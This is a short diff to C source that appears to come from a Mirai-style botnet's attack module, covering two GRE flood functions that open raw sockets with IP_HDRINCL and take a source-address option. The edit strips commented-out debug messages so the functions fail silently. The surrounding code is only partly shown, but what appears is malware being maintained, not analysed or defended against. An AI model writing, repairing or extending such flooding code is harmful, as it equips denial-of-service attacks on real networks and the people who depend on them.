@@ -33,18 +33,12 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
     uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("Failed to create raw socket. Aborting attack\n");
-#endif*/
+    {
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif*/
+    {
         close(fd);
         return;
     }
@@ -175,18 +169,12 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("Failed to create raw socket. Aborting attack\n");
-#endif*/
+    {
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif*/
+    {
         close(fd);
         return;
     }
